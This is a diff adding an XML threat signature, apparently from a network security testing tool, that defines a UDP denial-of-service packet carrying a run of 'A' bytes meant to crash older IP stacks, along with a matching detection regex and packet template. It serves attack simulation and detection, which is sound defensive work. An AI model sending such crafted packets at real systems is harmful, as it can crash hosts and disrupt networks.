@@ -1,0 +1,71 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="UDP Packet From localhost" />
+    <EngDesc display="true" value="This threat sends a packet with a payload of 23 'A''s from localhost.  The user can specify the source and destination ports, as well as the destination IP.  This attack has caused older IP stacks to fail." />
+    <Intent display="true">
+      <item value="Crashing" />
+      <item value="Denial_of_Service" />
+      <item value="Implementation_Exploitation" />
+    </Intent>
+    <Protocol display="true" value="UDP" />
+    <Type_Of_Equipment display="true">
+      <item value="Protocol" />
+    </Type_Of_Equipment>
+    <Severity display="true" value="" />
+    <Known_Vendors_Affected display="true" />
+    <Known_Products_Affected display="true" />
+    <Known_Versions_Affected display="true" />
+    <Credit display="true" value="unknown" />
+    <CVEID display="true" value="" />
+    <bugtraqID display="true" value="" />
+    <OSVDB display="true" value="" />
+    <Author display="true" value="Chuck McAuley" />
+    <ID display="true" value="000000ff465119e800a900fe009b00c92a01dd73" />
+    <Revision display="true" value="1" />
+    <Safe display="true" value="" />
+    <ServerSideAttack display="true" value="false" />
+    <SoftwareRevision display="true" value="1.4" />
+    <Suite display="true" value="Standard" />
+    <RunOnce display="false" value="" />
+    <Valid_Traffic display="false" value="" />
+    <AccessVector display="false" value="remote" />
+    <AccessComplexity display="false" value="low" />
+    <Authentication display="false" value="not-required" />
+    <ConfImpact display="false" value="none" />
+    <IntegImpact display="false" value="none" />
+    <AvailImpact display="false" value="complete" />
+    <ImpactBias display="false" value="normal" />
+    <FirstAdded display="false" value="" />
+    <LastModified display="false" value="636323660269064418" />
+    <SigStyle display="false" value="Matching" />
+    <targetNode display="false" value="A" />
+    <SigProtocol display="false" value="UDP" />
+    <Rate display="false" value="1" />
+    <Regex display="false" value="\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41" />
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="B" />
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="C" />
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="D" />
+    <NamedVar name="sourcePort" type="ImperfectControls.Port" value="null" index="E" />
+    <NamedVar name="destPort" type="ImperfectControls.Port" value="null" index="F" />
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="B" />
+      <for index="C" />
+      <for index="D" />
+      <for index="E" />
+      <for index="F" />
+    </for>
+  </Loops>
+  <PostScript />
+  <Output index="A" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="00:22:4F:88:06:47" pktType="0800">
+      <IP Version="4" InternetHeaderLength="5" TypeofService="0" TotalLength="" Identification="@random(0,FFFF)" FragmentOffset="0" TTL="@random(0,30)" Protocol="11" HeaderChecksum="" srcIP="10.123.234.240" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <UDP srcPort="$sourcePort" destPort="$destPort" checksum="" length="" Payload="41414141414141414141414141414141414141414141" />
+      </IP>
+    </Ethernet>
+  </Output>
+</threatSignature>
